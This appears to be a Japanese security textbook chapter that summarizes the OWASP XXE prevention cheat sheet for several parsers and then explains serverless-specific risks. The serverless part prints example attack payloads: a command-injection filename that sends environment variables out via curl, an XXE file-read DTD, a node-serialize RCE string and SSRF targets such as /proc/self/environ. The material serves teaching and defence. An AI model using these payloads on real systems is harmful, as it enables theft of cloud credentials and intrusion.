# 第11章 発展・方法論・防御の理解


## OWASP XXE防御チートシート

XXE（XML External Entity injection、XML外部エンティティインジェクション）は、外部からの入力を受け付けるXMLパーサが**弱い設定**のまま動いているときに成立する。攻撃者が細工したXML文書を送り込み、パーサに「外部の実体（エンティティ）」を解決させることで、ローカルファイルの読み取り、SSRF（Server Side Request Forgery、サーバーに攻撃者が指定した先へリクエストを送らせる攻撃）、ポートスキャン、サービス拒否（DoS）などを引き起こす。CWE-611として分類され、かつてはOWASP Top 10 2017のA4項目でもあった。

本節はOWASP CheatSheetSeriesの「XML External Entity Prevention Cheat Sheet」を原典として、言語・パーサ別の具体的な防御設定を整理する。前章までで攻撃手法（DTD、外部/パラメータエンティティ、OOB、SVG/Office経由など）を扱っているので、ここでは「なぜその設定で防げるのか」という**パーサ内部の挙動**に焦点を当てる。

> 出典: XML External Entity Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
> 出典: OWASP CheatSheetSeries GitHub（原文） — https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md

### 1. 根本原則:DTDを丸ごと無効化する

チートシートが最初に掲げる原則は極めて明快である。

> **「XXEを防ぐもっとも安全な方法は、常にDTD（外部エンティティ）を完全に無効化することである。」**

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

なぜこれが最善手なのか。XXEもBillion Laughs攻撃（DoSの一種で、入れ子のエンティティ参照が指数関数的に展開されてメモリを食い潰す攻撃）も、根っこは同じ「DOCTYPE宣言によってパーサに実体定義を許してしまうこと」にある。DOCTYPE自体を拒否すれば、`<!ENTITY ...>`を書く余地そのものが消えるので、外部エンティティ経由の攻撃も内部エンティティの再帰展開も同時に塞げる。裏を返せば、個別の「外部エンティティだけ無効化」という設定は、実装によっては漏れが残りやすく、DOCTYPE自体の禁止より一段弱い対策になる。

もしDTDを完全禁止できない事情がある（内部DTDでのバリデーションが業務要件、など）場合は、パーサごとに「外部エンティティ」「外部DTDロード」を個別に無効化する必要がある。

### 2. セキュリティ機能マトリクスと「欠けたときに何が起きるか」

原典は次の7項目を最小限の硬化ルールとして挙げている。

- DOCTYPE宣言の禁止
- 外部エンティティの無効化
- 外部DTDロードの無効化
- secure processingモードの有効化
- パラメータエンティティ(`%entity;`という記法で、外部DTD内で使われる特殊なエンティティ)の無効化
- XInclude(別のXML/ファイルの内容を現在の文書に取り込む仕組み)の無効化
- エンティティ展開回数の制限
- レガシーなXMLパーサを使わない
- 未検証のXMLをデフォルト設定のまま処理しない

これらが「無い」場合に何が起きるかを整理すると次のようになる。

| 欠けている制御 | 結果として生じる脆弱性 |
| --- | --- |
| DOCTYPE無効化なし | 古典的なXXEペイロードがそのまま機能する |
| 外部エンティティ有効 | SSRF、ファイル漏洩、ポートスキャン |
| 外部DTDロード許可 | Blind XXE(レスポンスに結果が直接現れないタイプのXXE)→隠れたSSRF |
| 展開回数の制限なし | Billion Laughs DoS |
| XInclude有効 | `file://`経由のローカルファイル開示とSSRF |
| secure processing無効 | 重要な保護機構がまとめてバイパスされる |
| スキーマ検証が外部URLを取得してしまう | 意図しない外部への通信が発生する |

ここで実務的に重要なのは、「XMLパーサの安全性は単一のフラグでは決まらない」という点である。DOCTYPE、外部エンティティ、外部DTD、XInclude、展開制限は独立した設定項目であり、いずれか一つが漏れていれば攻撃経路は残る。後述のJavaの例で顕著だが、「3つセットで初めて安全」という組み合わせもあるため、チェックリスト的に網羅する必要がある。

### 3. C/C++: libxml2 / libxerces-c

#### libxml2

`xmlParserOption`という列挙型のオプションに以下を**設定しない**ことが条件になる。

- `XML_PARSE_NOENT`: エンティティを展開し、置換テキストに置き換える
- `XML_PARSE_DTDLOAD`: 外部DTDをロードする

これらのフラグを渡すAPI(`xmlCtxtReadDoc`、`xmlReadFile`、`xmlReadMemory`など多数)を使っている箇所を洗い出し、両フラグが立っていないか確認する必要がある。

重要な時期的事実として、**libxml2バージョン2.9以降ではXXEはデフォルトで無効化されている**(2012年10月のパッチによる)。したがって、古いlibxml2(2.9未満)にリンクされたアプリケーションは、明示的な設定なしでも脆弱になりうる。依存ライブラリのバージョンを必ず確認すること。

#### libxerces-c

```cpp
XercesDOMParser *parser = new XercesDOMParser;
parser->setCreateEntityReferenceNodes(true);
parser->setDisableDefaultEntityResolution(true);
```

```cpp
SAXParser* parser = new SAXParser;
parser->setDisableDefaultEntityResolution(true);
```

```cpp
SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
parser->setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);
```

`setDisableDefaultEntityResolution(true)`は、パーサ組み込みのデフォルトエンティティ解決器(未設定時に外部リソースへ実際にアクセスしてしまう解決器)を無効にし、エンティティ解決をアプリケーション側の制御下に置く。設定しなければ、DOMParser/SAXParser/SAX2XMLReaderのいずれも既定の解決器が外部参照を素直に辿ってしまう。

### 4. Java: 構造的に厄介な二つの理由

Javaのxxe対策が他言語より複雑になるのには構造的な理由が二つある。

1. **パーサの実体は実行時(デプロイ時)に決まる。** JAXP(Java API for XML Processing)のファクトリはプラガブルであり、`newInstance()`が実際に返す実装はクラスパス次第である。コード上は同じ`DocumentBuilderFactory.newInstance()`でも、本番環境でApache Xercesが使われるかJDK組み込みパーサが使われるかはコードからはわからない。
2. **ほとんどのセキュリティ設定は「任意」である。** 外部エンティティ解決を無効化する多くのfeatureはオプション扱いであり、パーサがそれを認識しなければ例外を投げるだけで、設定は反映されない。その例外を`catch`して握りつぶすコードが多く見られるが、それは「硬化されないまま未検証XMLを処理する」状態を意味する。一方で、**リゾルバ(resolver)フックだけは全実装が必ずサポートする**という違いがある。

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
final DocumentBuilder builder;
try {
    // 下表のboolean feature
    dbf.setFeature(feature, safeFeatureValue);
    // 下表のString attribute
    dbf.setAttribute(attribute, safeAttributeValue);
    builder = dbf.newDocumentBuilder();
} catch (ParserConfigurationException | IllegalArgumentException e) {
    // パーサが設定を認識しなかった = 硬化が適用されなかった
    // 設定できないファクトリのまま処理を続けず、パースを拒否する
    throw new IllegalStateException("Unable to secure the XML parser", e);
}
```

このコードの要点は「例外を握りつぶさない」ことである。安全側に倒すなら、設定が通らなかった時点でパースそのものを止めるべきという設計思想が示されている。

#### 4.1 リゾルバ(Resolver)方式を優先する

JAXPには外部コンテンツの取得を止める方法が2つある。**リゾルバ**と**フィーチャ**であり、全実装での動作が保証されているのはリゾルバの方だけである。

```java
// nullを返してはいけない。nullはパーサ自身に解決させる意味になる。
EntityResolver denyAll = (publicId, systemId) -> {
    throw new SAXException("External references are not allowed: " + systemId);
};

// どちらのファクトリもリゾルバを保持しないので、生成したオブジェクトごとに設定する
DocumentBuilder builder = ...;
builder.setEntityResolver(denyAll);

XMLReader reader = ...;
reader.setEntityResolver(denyAll);
```

StAX(Streaming API for XML)向けには`XMLResolver`を使う。

```java
XMLResolver denyAll = (publicId, systemId, baseURI, namespace) -> {
    throw new XMLStreamException("External references are not allowed: " + systemId);
};

// DOM/SAXと違い、StAXのファクトリは自身のリゾルバを生成した全readerに引き継ぐ
XMLInputFactory xmlInputFactory = ...;
xmlInputFactory.setProperty(XMLInputFactory.RESOLVER, denyAll);
```

ここに落とし穴がある。`XMLResolver`は決められた型(Javadocが列挙する型)のいずれかを返さなければならず、それ以外は未定義動作として`null`扱いされる可能性がある。「何も返さない」つもりで空文字列を返すと、逆にプロセッサが自分でエンティティを解決してしまう。空を返したいときは`InputStream.nullInputStream()`を使うこと。

**リゾルバはエンティティ展開の回数までは制限しない。** 入れ子の内部エンティティは外部リソースを必要としないため、DOCTYPE宣言を受け付けるパーサはリゾルバを設定していてもBillion Laughs型の展開攻撃には引き続き晒される。展開回数の制限には`FEATURE_SECURE_PROCESSING`を有効にする必要がある。

#### 4.2 DOM: DocumentBuilderFactory

DOMには保守されている実装が複数ある(Apache Xerces、JDK組み込み(Xerces派生)、Android組み込み(kXMLベース)、Oracle XDK)。それぞれ認識する設定が異なる。

| 設定 | 安全な値 | 認識する実装 | 効果 |
| --- | --- | --- | --- |
| `jdk.xml.dtd.support` | `deny`または`ignore` | JDK組み込みパーサ(Java 22+) | DOM/SAX/StAX/検証/変換すべてでDTDを拒否または無視 |
| `disallow-doctype-decl` | `true` | Xercesおよび派生 | DOCTYPEを含む文書を丸ごと拒否 |
| `ACCESS_EXTERNAL_DTD` | `""`(空文字) | JDK組み込みパーサ(7u40+) | 外部DTDと外部エンティティ参照を拒否 |
| `ACCESS_EXTERNAL_SCHEMA` | `""` | JDK組み込みパーサ(7u40+) | `schemaLocation`、`xs:import`、`xs:include`が指すスキーマを拒否 |
| `external-general-entities` | `false` | オプションのSAX2機能 | 外部一般エンティティを無視 |
| `external-parameter-entities` | `false` | オプションのSAX2機能 | 外部パラメータエンティティを無視 |
| `load-external-dtd` | `false` | Xercesおよび派生 | 外部サブセットを無視(非検証時のみ) |
| `FEATURE_SECURE_PROCESSING` | `true` | DOM/SAX(JAXP)必須 | 実装独自の処理上限を有効化 |

推奨の組み立ては次のとおり。

- まずJVM上で`disallow-doctype-decl`を試す(Xerces派生が使われていることが多い)。
- 内部DTD/エンティティを本当に必要とする場合は、`external-general-entities`・`external-parameter-entities`・`load-external-dtd`の**3つすべて**を無効化する。どれか1つでも有効なままだと、そこが攻撃経路として残る。
- `FEATURE_SECURE_PROCESSING`をAPI経由で明示的に有効化すると、JDK組み込みパーサでは`ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA`の**デフォルト値**が空文字列になる。ただしこれはデフォルトの上書きに過ぎず、プロパティ優先順位ではシステムプロパティや設定ファイルより下位にあるため、運用側が上書きできる点に注意。

逆に安全性を壊す設定もある。`setValidating(true)`を呼ぶと`load-external-dtd`は「検証時は常にON」という扱いになり効かなくなる。`setXIncludeAware(true)`を呼ぶと、DOCTYPEとは別系統の外部取得経路(XInclude)が開き、これはリゾルバでしか閉じられない。

**`setExpandEntityReferences`は「偽物の友人(false friend)」である。** この設定はエンティティ参照ノードをツリー内でどう表現するかを制御するだけで、外部リソースを取得するかどうかには関与しない。名前から誤解しやすいが、これを`false`にしてもXXEは防げない。

#### 4.3 SAX: SAXParserFactoryとXMLReader

DOMと同じ実装系列が使われるが、注意点が2つある。

- `SAXParserFactory`はfeature APIしか公開しないため、property扱いの設定は`SAXParser.getXMLReader()`で得た`XMLReader`に対して設定する必要がある。
- `XMLReaderFactory.createXMLReader()`ではなく`SAXParserFactory`経由でreaderを取得すること(前者はJava 9以降非推奨)。

もっとも実務上見落としやすい落とし穴は次である。**`SAXParser.parse(source, DefaultHandler)`は、そのハンドラを`XMLReader`の`EntityResolver`として上書きしてしまう。** これは、あなたが事前に設定したリゾルバを、`null`を返すリゾルバで黙って置き換えるという意味になる。この置き換えは`SAXParser`自体の実装(特定のパーサ実装ではなく、Java標準API側)で起きるため、どのパーサを使っていても逃れられない。対策は、設定済みの`XMLReader.parse(...)`を直接呼ぶか、ハンドラの`resolveEntity`をオーバーライドして外部参照を拒否することであり、リゾルバ設定後にこの`SAXParser`のオーバーロードを使わないようにする。

#### 4.4 StAX: XMLInputFactory

StAXにはJDK組み込みリーダー、Woodstox、Aaltoなどの実装がある(Android・Oracle XDKには存在しない)。StAX仕様自体はセキュリティ関連プロパティを持つが、既定値は`true`またはunspecifiedである。

| 設定 | 安全な値 | 効果 |
| --- | --- | --- |
| `jdk.xml.dtd.support` | `deny` | DOCTYPEを含む文書を拒否(JDK組み込み、Java 22+) |
| `SUPPORT_DTD` | `false` | DTDを拒否ではなくスキップする。内部サブセットも外部サブセット取得も発生しない |
| `IS_SUPPORTING_EXTERNAL_ENTITIES` | `false` | 外部の解析対象エンティティを解決しない |

```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

`setProperty`は未知の名前に対して例外を投げるため、この呼び出し自体がすでに「fail closed(失敗時に安全側へ倒れる)」設計になっている。StAXには`FEATURE_SECURE_PROCESSING`に相当するものが無いため、エンティティ展開の上限は実装依存である。

#### 4.5 Oracle XDKと、JAXPパーサをラップするライブラリ

Oracle XML Developer's Kit(`oracle.xml.parser.v2`)は独自実装で、`DOMParser`に対して`setSecureProcessing()`を呼ぶだけでエンティティ解決の無効化と展開数の制限が一括で適用される(引数なし・取り消し不可)。`XMLParser`基底クラスに乗っているためSAXパーサ側も同じ呼び出しで硬化できる。

dom4jやJDOMのように、自分ではパースせずJAXPパーサを内部で使うライブラリは、SAXの節で説明した方法で硬化した`XMLReader`を渡す必要がある。特に**dom4jは渡した`XMLReader`のリゾルバを`read()`のたびに上書きする**ため、`SAXReader.setEntityResolver`にも同じdeny-allリゾルバを別途設定しなければならない。

#### 4.6 パーサを消費するだけのインターフェース

`TransformerFactory`、`SchemaFactory`、`Validator`、`XPath`、JAXBの`Unmarshaller`はそれ自体パーサではなく、パーサを**消費する**側である。硬化したパーサを渡さなければ、内部で独自にパーサを生成してしまう。

```java
// 硬化済みのreaderを作る
XMLReader reader = ...;

// Transformer.transform()もValidator.validate()もSAXSourceを受け取れる
transformer.transform(new SAXSource(reader, new InputSource(inputStream)), result);
```

```java
// 硬化済みのStAX readerを作る
XMLStreamReader xsr = ...;

Object result = jaxbContext.createUnmarshaller().unmarshal(xsr);
```

ここで重要な区別は、「文書自身が持つ参照」と「自分たちのスタイルシート/スキーマが持つ参照」を分けて考えることである。文書側の`xml-stylesheet`処理命令や`xsi:schemaLocation`は攻撃者が制御できるため拒否のまま維持し、逆に自分のXSLTやXSDが使う`xsl:import`/`xs:include`のような正当な分割参照は、閉じるのではなく`CatalogResolver`(既知の識別子だけをローカルファイルへマップし、それ以外は拒否する)などで**許可範囲を絞る**方向で扱う。

### 5. .NET

.NETのパーサ群は「バージョンで安全性が変わる」典型例であり、時系列を押さえることが必須になる。総括すると、**.NET Framework 4.5.2以降**では主要パーサの既定動作が安全側に変わっている。

| パーサ | 4.5.2未満 | 4.5.2以降 |
| --- | --- | --- |
| `XmlDocument` | 危険(既定で`XmlResolver`がnullでない) | 安全(既定で`XmlResolver`がnull) |
| `XmlTextReader` | 危険 | 安全(内部`XmlResolver`が既定でnull) |
| `XPathNavigator` | 危険(`IXPathNavigable`実装に依存) | 安全 |
| `XmlReader` | 条件付き危険 | 安全(`DtdProcessing`が既定`Prohibit`、`XmlResolver`も既定null) |
| `XmlNodeReader` | 安全 | 安全(常にDTDを無視) |
| `XmlDictionaryReader` | 安全 | 安全 |
| `XDocument`/`XElement`(LINQ to XML) | Billion Laughsは不明瞭 | 外部エンティティ・Billion Laughsとも安全 |

危険なバージョンでの典型的な対処は`XmlResolver`を明示的に`null`へ設定することである。

```csharp
static void LoadXML()
{
    string xxePayload = "<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/Users/testdata2.txt'>]>"
                      + "<doc>&win;</doc>";
    string xml = "<?xml version='1.0' ?>" + xxePayload;

    XmlDocument xmlDoc = new XmlDocument();
    // これをnullにすることでDTDが無効になる。既定ではnullではない点に注意。
    xmlDoc.XmlResolver = null;
    xmlDoc.LoadXml(xml);
    Console.WriteLine(xmlDoc.InnerText);
    Console.ReadLine();
}
```

なぜ`XmlResolver = null`で防げるのか。`XmlResolver`は外部リソース(DTDが指す`SYSTEM`識別子など)を実際に取得しにいくコンポーネントであり、これをnullにすると「取得する手段が存在しない」状態になるため、パーサがDOCTYPE自体は読んでもエンティティの実体解決に失敗する(あるいは無視する)。

`.NET 4.0`から`4.5.2`未満の期間では、旧来の`ProhibitDtd`プロパティが非推奨化され`DtdProcessing`に置き換わったが、**既定値は変更されなかった**ため`XmlTextReader`は引き続き脆弱である。明示的に`Prohibit`を指定する必要がある。

```csharp
XmlTextReader reader = new XmlTextReader(stream);
// 既定値がParseのままなので、明示指定が必要
reader.DtdProcessing = DtdProcessing.Prohibit;  
```

ASP.NETでは`Web.config`の`<httpRuntime targetFramework="..." />`が実質的な安全性判定に絡む。アプリがビルドされた.NETバージョンと`targetFramework`のうち**低い方**が実効バージョンとして扱われるため、コード側だけ新しくしても`Web.config`側の指定を怠ると既定で脆弱になる。よく似た`<compilation targetFramework="..." />`はこの安全性とは無関係なので混同しないこと。

Billion Laughs型のDoSに関する検証は、別テストツール(BounceSecurity製)によって.NET 4.5.2以降の安全性が確認されている。

### 6. iOS: libxml2とNSXMLDocument

iOSはC/C++のlibxml2をそのまま含むため、前述のlibxml2に関する注意がそのまま当てはまる。ただし**iOS6以前に同梱されているlibxml2はバージョン2.9未満**であり、2.9で入った既定無効化の恩恵を受けられない点に注意が必要である。

`NSXMLDocument`はlibxml2の上に構築された独自型で、libxml2単体より追加の保護を持つ。

- iOS4以前: すべての外部エンティティが既定でロードされる(危険)
- iOS5以降: ネットワークアクセスを必要としないエンティティのみロードされる(相対的に安全)

いずれのバージョンでも、`NSXMLDocument`生成時に`NSXMLNodeLoadExternalEntitiesNever`を指定すればXXEを完全に無効化できる。

### 7. PHP

**PHP 8.0以降**は、libxml2ベースの既定パーサでXXEが既定で防止される。PHP 8.0未満では明示的な無効化が必要になる。

```php
libxml_set_external_entity_loader(null);
```

これは、外部エンティティのローダー(実際に外部リソースを取得する関数)そのものをnullに差し替えることで、パーサが外部参照を解決しようとしても呼び出す先が無い状態を作る。原典はこの挙動の悪用例として、Facebookで修正されたXXE脆弱性を扱ったSensePostの記事を挙げている。

### 8. Python

Python公式ドキュメントの「xml脆弱性」節に基づく整理として、Python 3の標準XML関連モジュール(`sax`、`etree`、`minidom`、`pulldom`、`xmlrpc`)は次の傾向を持つ。

| 攻撃種別 | sax | etree | minidom | pulldom | xmlrpc |
| --- | --- | --- | --- | --- | --- |
| Billion Laughs | 脆弱 | 脆弱 | 脆弱 | 脆弱 | 脆弱 |
| Quadratic Blowup(エンティティ長の二乗に比例して負荷が増えるDoS変種) | 脆弱 | 脆弱 | 脆弱 | 脆弱 | 脆弱 |
| 外部エンティティ展開 | 安全 | 安全 | 安全 | 安全 | 安全 |
| DTD取得 | 安全 | 安全 | 安全 | 安全 | 安全 |
| Decompression Bomb | 安全 | 安全 | 安全 | 安全 | 脆弱 |

つまり標準ライブラリは「外部エンティティ・外部DTD取得」については既定で安全だが、**内部エンティティの再帰展開によるDoS(Billion Laughs / Quadratic Blowup)には無防備**という非対称な状態にある。これはXXEそのもの(外部リソースへのアクセス)とDoS(内部の再帰展開)が別の攻撃面であることを裏付けている実例でもある。この隙間を埋めるために、`defusedxml`パッケージ(標準モジュールの安全なドロップイン代替として、DoS系攻撃も含めてブロックする)の利用が推奨されている。

### 9. 静的解析による検知(Semgrepルール)

原典はJavaの3系統のパーサに対応する公式Semgrepルールを紹介している。

- `DocumentBuilderFactory`向け: `documentbuilderfactory-disallow-doctype-decl-missing`
- `SAXParserFactory`向け: `saxparserfactory-disallow-doctype-decl-missing`
- `XMLInputFactory`向け: `xmlinputfactory-possible-xxe`

いずれも「`disallow-doctype-decl`などの安全化フィーチャが設定されていないファクトリ生成」を検出するルールであり、CIパイプラインに組み込むことで、本節で説明した「例外を握りつぶして硬化が効かないまま動いてしまう」パターンをレビュー前に機械的に洗い出せる。

### 10. まとめ:防御設計の優先順位

原典全体を通じて一貫しているのは次の優先順位である。

1. **可能ならDOCTYPE宣言そのものを拒否する。** これが唯一、XXEとBillion Laughs型DoSの両方を一度に塞ぐ設定であり、迷ったらまずこれを試す。
2. **DOCTYPEを完全には拒否できない場合、外部エンティティ・外部パラメータエンティティ・外部DTDロードの3つをセットで無効化する。** 1つでも漏れれば攻撃経路が残る。
3. **リゾルバはフィーチャより信頼性が高い。** フィーチャは実装依存でサイレントに無視されうるが、リゾルバはJAXPの契約上どの実装でも必ず尊重される。
4. **エンティティ展開の上限(secure processing)は、リゾルバとは独立に設定する。** リゾルバは外部アクセスを止めるだけで、内部エンティティの再帰展開までは止めない。
5. **バージョンと年次を必ず確認する。** libxml2の2.9、PHPの8.0、.NET Framework 4.5.2、JDKの22(dtd.support)のように、多くの言語・ライブラリで「ある時点からデフォルトが安全になった」という区切りが存在する。自分のスタックがどちら側にいるかを確認しないまま「最近のバージョンだから安全」と判断するのは危険である。
6. **パーサを直接使わないラッパー(dom4j、TransformerFactory、Validatorなど)にも同じ警戒が必要。** ラッパー自身が内部で未硬化のパーサを生成したり、渡したリゾルバを勝手に上書きしたりするケースがある。

最後に、原典は参考文献としてTimothy Morganの2014年の論文「XML Schema, DTD, and Entity Attacks」を挙げている。これはXXEおよび関連するDTD・スキーマ由来の攻撃手法を体系的にまとめた古典的な研究であり、外部エンティティだけでなくXMLスキーマ経由の攻撃面(スキーマの`xs:import`など)まで含めて整理している点で、本節のようなパーサ設定レベルの防御と併せて読む価値がある。

> 出典: XML External Entity Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
> 出典: OWASP CheatSheetSeries GitHub（原文, Timothy Morgan論文への参照を含む） — https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md

## 日本語の防御・実例（サーバレス/SSRF）

これまでの章では XXE（XML External Entity、XML パーサに外部実体を解決させて任意ファイル読み取りやSSRFを引き起こす脆弱性）やファイルアップロードの脆弱性を、クラシックなオンプレミス／VM 構成のサーバーを前提に扱ってきた。本節では視点を変え、AWS Lambda に代表される**サーバーレス**環境で XXE・SSRF・RCE がどのように現れるか、そして実際のバグバウンティ事例として GitHub の内部ネットワークへ到達できた SSRF がどのような設計ミスから生まれたかを、GMO Flatt Security（フラットセキュリティ）の技術ブログ2本から読み解く。両者に共通するのは、「ライブラリの内部実装の順序」や「実行環境特有の資格情報の置き場所」といった、表面的なコードレビューだけでは気づきにくい構造的な原因である。

### サーバーレス環境が抱える特有のリスク

まず前提として、サーバーレス（FaaS: Function as a Service）環境がなぜ通常のサーバーと異なるリスクプロファイルを持つのかを整理する。AWS Lambda では、関数に付与された IAM ロールの一時クレデンシャル（`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN`）が、実行環境の**環境変数**として格納される。これは Lambda が「サーバーを意識せず関数だけを書く」ためのマネージド抽象化の代償で、関数のプロセス内から環境変数を読み取れる脆弱性が一つでも存在すれば、その関数に紐づく AWS 権限がまるごと攻撃者の手に渡る。オンプレミスの sink（入力が最終的に実行・解釈される危険な代入先）漏洩が「そのサーバー」の被害で済むのに対し、Lambda では「そのロールが持つ AWS サービス全体」への波及になりやすい点が特有のリスクとされている。

> ⚠️ **注記**: 以下の脆弱性事例（OSコマンドインジェクション、XXE、安全でないデシリアライゼーション、SSRF、RCE）は、GMO Flatt Security のブログ記事「サーバーレスのセキュリティリスク」で、Lambda 上で実際に起こりうる脆弱性パターンとして整理・例示されているものである。記事はこれらを OWASP のチートシートと合わせて解説している。

#### OS コマンドインジェクション（CWE-78）とLambda特有の被害

ファイルアップロード機能を持つ Lambda 関数で、アップロードされたファイル名をそのままシェルコマンドに埋め込むケースが例示されている。

```python
subprocess.call('convert {FileName}'.format(FileName=download_file), shell=True)
```

これは `shell=True` によって OS のシェルがコマンド文字列全体を解釈するため、ファイル名に含まれる `;` や `|` がシェルのメタ文字として働いてしまう典型的な sink である。悪意あるファイル名の例：

```
hoge; printenv | curl X.X.X.X --data-urlencode @-; #.jpg
```

`;` でコマンドを区切り、`printenv`（環境変数の一覧表示）の出力を `curl` で外部サーバーへ POST している。前述の通り、Lambda の環境変数には IAM クレデンシャルが入っているため、この一撃で AWS の一時アクセスキーが攻撃者の手元に届く。通常の Web サーバーであれば「コマンド実行はできたがクレデンシャルはファイル権限で守られている」という多層防御が効く場面でも、サーバーレスでは環境変数を読めた時点でクラウド権限まで一直線に繋がるという点が、この章のテーマである「サーバーレス特有のリスク」の核心である。

#### XXE（CWE-611）：Lambda上でのファイル読み取り

XXE 自体の仕組みはこれまでの章で解説した通りだが、記事では Python の `lxml` や Node.js の `xml2js` のような、デフォルト設定で外部実体解決を許してしまうライブラリを使う Lambda 関数が例示されている。

```python
parser = etree.XMLParser()
document = etree.fromstring(download_file, parser)
```

`etree.XMLParser()` を引数なしで生成すると、`resolve_entities` などのセキュリティ関連オプションがライブラリのデフォルト（バージョンによって異なるが、外部実体解決を有効にしたままのケースがある）のまま使われる。ここに以下のような DTD（Document Type Definition、XML文書の構造を定義する宣言部）を注入する。

```xml
<!DOCTYPE loadthis [
<!ELEMENT loadthis ANY>
<!ENTITY somefile SYSTEM "file:////var/task/handler.py">
]>
<loadthis>&somefile;</loadthis>
```

`SYSTEM` 識別子付きの外部実体宣言により、パーサは `file:////var/task/handler.py`（Lambda のデプロイパッケージが展開される標準パス `/var/task/` 配下）を読み込み、`&somefile;` の位置に埋め込んで返す。これによりアプリケーションのソースコードそのものや、`/proc/self/environ`（Linux でプロセスの環境変数を保持する疑似ファイル）を読み取ることが可能になる。`/proc/self/environ` が読めれば、先の OS コマンドインジェクションと同様に IAM クレデンシャルへ到達できる。つまり XXE は「ファイル読み取り」という一見地味な影響でも、サーバーレスでは環境変数経由でクラウド権限奪取に直結するという点を押さえておく必要がある。

#### 安全でないデシリアライゼーション（CWE-502）

Node.js の `node-serialize` パッケージ v0.0.4 に存在した既知の脆弱性（CVE-2017-5941）が例に挙げられている。このライブラリの `unserialize()` 関数は、内部で JavaScript オブジェクトを復元する際に `eval()` を使用しており、シリアライズされた文字列の中に関数定義を仕込むことで任意コード実行に繋がる。

```json
{
  "rce": "_$$ND_FUNC$$_function(){
    require('child_process').exec('printenv', callback);
  }()"
}
```

`_$$ND_FUNC$$_` は `node-serialize` が「これは関数だ」と認識するための特殊なマーカー文字列で、`unserialize()` がこのマーカーを検出すると該当部分を `eval()` に渡してしまう。結果として `child_process.exec('printenv', ...)` が実行され、ここでもまた環境変数（＝IAM クレデンシャル）が窃取対象になる。デシリアライゼーションの sink は「信頼できない入力をオブジェクトに戻す処理」全般に潜むため、Lambda のイベントペイロード（API Gateway 経由のリクエストボディなど）を安易に `unserialize` するコードは特に注意を要する。

#### SSRF（CWE-918）：Lambda ランタイム API とファイルスキーム

サーバーレス特有の SSRF 経路として2ケースが示されている。1つ目は Lambda のランタイム内部 API へのアクセスである。

```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

これは Lambda の実行環境がランタイムとの通信に使う内部 HTTP エンドポイントで、通常は関数コード自身がリクエストを送るものだが、関数内に SSRF の脆弱な箇所（外部 URL を任意に指定できるリクエスト処理）があると、攻撃者はこの localhost 上のエンドポイントへリクエストを向けさせることができる。内部 API から呼び出しごとの詳細情報（イベントデータや呼び出しID）が取得できる可能性があり、他のリクエストのデータが混入するような情報漏洩の糸口になり得る。

2つ目は `file://` スキームを使ったパストラバーサル型の SSRF である。

```
file:///proc/self/environ
```

URL を受け取ってフェッチするような処理（画像取得、Webhook 送信、PDF 生成時の外部リソース読み込みなど）で `http(s)://` 以外のスキームを弾いていないと、`file://` スキームでローカルファイルシステムへアクセスできてしまう。記事では実例として Python の PDF 生成ライブラリ `reportlab` の脆弱性（CVE-2020-28463）が挙げられている。これは PDF 内の `<img>` タグの `src` 属性に渡された値をそのままリソース取得に使ってしまう問題で、`file://` スキームを与えることでサーバー上の任意ファイルを PDF に埋め込ませ、間接的に読み取ることができた。XXE の仕組み（外部実体で `file://` を参照する）と、SSRF の仕組み（アプリケーションが代理でリクエストを発行する）は、どちらも「アプリケーションに正規のリクエスト発行者としてローカル資源へアクセスさせる」という点で本質的に同じ構造を持っていることが、この2つの事例からも見て取れる。

#### RCE（CWE-94）と防御のまとめ

記事は RCE を独立した脆弱性というより、上記の脆弱性（コマンドインジェクション、デシリアライゼーション、あるいは XXE 経由で読み取ったコードやSSRFで到達した内部管理APIの悪用）が連鎖した結果として位置づけている。防御策として次の4層が挙げられている。

- **ソースコード層**: 入力値の検証・サニタイズを徹底し、シェルコマンドへのユーザー入力の直接埋め込みを避ける。
- **ライブラリ層**: 依存ライブラリを最新に保つ。XXE 対策として外部実体・外部DTDの解決を明示的に無効化する（例: `lxml` の `resolve_entities=False` や `no_network=True` 相当のパーサ設定）。デシリアライゼーションは信頼できるデータソースのみを対象にする。
- **権限（IAM）層**: 最小権限の原則（Least Privilege）に従い、Lambda 関数のロールには必要最小限のアクションのみを許可する。これにより、たとえ環境変数からクレデンシャルが漏れても被害範囲を限定できる。
- **モニタリング層**: CloudWatch によるログ・メトリクス監視、CloudTrail によるデータイベント記録、X-Ray によるトレース分析、AWS Config によるリソース設定監査を組み合わせ、異常な API 呼び出しパターンを検知する。

サーバーレスというアーキテクチャの変化そのものが脆弱性を生むわけではないが、「環境変数にクレデンシャルが載る」「関数コードがそのままファイルシステム上に展開される」「内部ランタイムAPIがlocalhostで待ち受ける」といった実行モデル特有の事情により、従来型の脆弱性（コマンドインジェクション・XXE・デシリアライゼーション・SSRF）の**影響範囲が実質的にクラウド権限全体へ拡大しやすい**という点が、この記事の一貫したメッセージである。

> 出典: サーバーレスのセキュリティリスクとその対策について — https://blog.flatt.tech/entry/lambda_and_serverless_security

### 実例：GitHubの内部ネットワークへアクセス可能だったSSRF（HackerOne H1-512）

